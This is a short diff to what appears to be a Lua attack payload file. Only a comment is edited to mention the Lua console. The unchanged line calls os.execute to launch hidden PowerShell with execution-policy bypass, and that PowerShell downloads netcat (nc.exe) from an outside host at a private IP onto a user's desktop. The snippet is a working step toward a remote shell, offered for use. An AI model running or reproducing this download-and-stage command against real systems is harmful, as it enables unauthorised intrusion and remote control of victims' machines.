@@ -1,4 +1,4 @@
-# You can send the commands separated or concatenated.
+# You can send the commands separated or concatenated in the Lua console.
 
 os.execute('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadFile(\'http://192.168.234.131:8000/nc.exe\', \'C:\\\\Users\\\\usuario\\\\Desktop\\\\Drops\\\\nc.exe\')"')
 
